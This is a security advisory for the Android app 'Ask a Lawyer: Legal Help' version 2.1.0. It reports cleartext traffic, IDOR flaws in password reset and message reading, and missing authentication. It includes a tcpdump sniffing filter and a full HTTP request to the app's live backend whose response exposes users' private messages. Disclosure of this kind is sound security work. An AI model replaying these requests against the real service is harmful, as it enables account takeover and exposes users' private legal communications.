## Summary
Software name: "Ask a Lawyer: Legal Help"

Software link: https://play.google.com/store/apps/details?id=com.absmallbusinessmarketing.askalawyer

Version: 2.1.0

## Issue #1 - Unencrypted communications
Description: The application allows users to connect to it over unencrypted connections. 
An attacker suitably positioned to view a legitimate user's network traffic could record and monitor their interactions with the application and obtain any information the user supplies.

POC:
```
tcpdump -s 0 -A 'tcp dst port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'
```
![Sniff clear text password](/Images/com.absmallbusinessmarketing.askalawyer/Sniff_HTTP_Data.PNG)

## Issue #2 - Insecure Direct Object References lead to all account takeover
Description: IDOR at **reset password function**, via **username** parameter, an attacker can guess username and get some sensitive information from
response like: **userinfo, password, email, secquestions,...**

POC:
![Guess users](/Images/com.absmallbusinessmarketing.askalawyer/IDOR%20-%20Guess%20user%20name.PNG)
![Attack user A](/Images/com.absmallbusinessmarketing.askalawyer/IDOR%20-%20Takeover%20account%20a.PNG)
![Attack user User](/Images/com.absmallbusinessmarketing.askalawyer/IDOR%20-%20Takeover%20account%20user.PNG)

## Issue #3 - Insecure Direct Object References lead to read private messages
Description: IDOR at **Read messages function**, via **userid** parameter, an attacker can perform IDOR attack that lead to read private messages

POC:
![IDOR Attack with Burp Intruder](/Images/com.absmallbusinessmarketing.askalawyer/Attack%20IDOR%20userid%20parameter%20with%20Burp%20Intruder%201.PNG)
![IDOR Attack with Burp Intruder](/Images/com.absmallbusinessmarketing.askalawyer/Attack%20IDOR%20userid%20parameter%20with%20Burp%20Intruder%202.PNG)
![IDOR Attack with Burp Intruder](/Images/com.absmallbusinessmarketing.askalawyer/Attack%20IDOR%20userid%20parameter%20with%20Burp%20Intruder%203.PNG)

## Issue #4 - Unauthenticated Access
Description: This app do not import any authorization mechanisms that help an attacker can exploit vulnerabilities easier.

POC:

Request
```
POST /lawyer/mobileservice.php HTTP/1.1
Host: www.abliveclient.com
Content-Length: 40
Accept: application/json, text/javascript, */*; q=0.01
Origin: file://
User-Agent: Mozilla/5.0 (Linux; Android 4.4.4; Samsung Galaxy S5 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: en-US
X-Requested-With: com.absmallbusinessmarketing.askalawyer
Connection: close

action=get_chat_history&userid=1&msgno=0
```
Response
```
HTTP/1.1 200 OK
Date: Sun, 03 Mar 2019 09:33:05 GMT
Server: Apache/2.2.31 (Unix) mod_ssl/2.2.31 OpenSSL/1.0.1e-fips mod_bwlimited/1.4
X-Powered-By: PHP/5.4.45
Access-Control-Allow-Origin: *
Connection: close
Content-Type: text/html
Content-Length: 4884

{"success":"1","list":[{"0":"256","id":"256","1":"1","userid":"1","2":"0","agentid":"0","3":"0","msgtype":"0",
"4":"hello jeriamiah","msg":"hello jeriamiah","5":"2013-12-07 18:40:37","sendtime":"2013-12-07 18:40:37","6":"1","status":"1"},
{"0":"233","id":"233","1":"1","userid":"1","2":"0","agentid":"0","3":"0","msgtype":"0","4":"check","msg":"check",
"5":"2013-11-25 10:02:37","sendtime":"2013-11-25
...
```
